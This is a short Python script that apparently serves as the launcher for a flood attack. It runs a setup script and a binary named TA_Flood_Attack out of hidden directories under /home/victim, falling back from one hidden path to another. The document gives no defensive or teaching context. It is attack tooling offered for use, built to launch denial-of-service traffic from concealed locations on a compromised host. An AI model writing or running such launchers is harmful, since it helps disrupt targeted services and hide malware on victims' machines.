import os


def launch_attack():
    os.system('/usr/bin/python /home/victim/.etc/.module/SetUp_Attack.py || ( /usr/bin/python /home/victim/.var/.module/SetUp_Attack.py )')
    os.system('cd /home/victim/.etc/.module && ./TA_Flood_Attack || ( cd /home/victim/.var/.module && ./TA_Flood_Attack )')


if __name__ == '__main__':
    launch_attack()
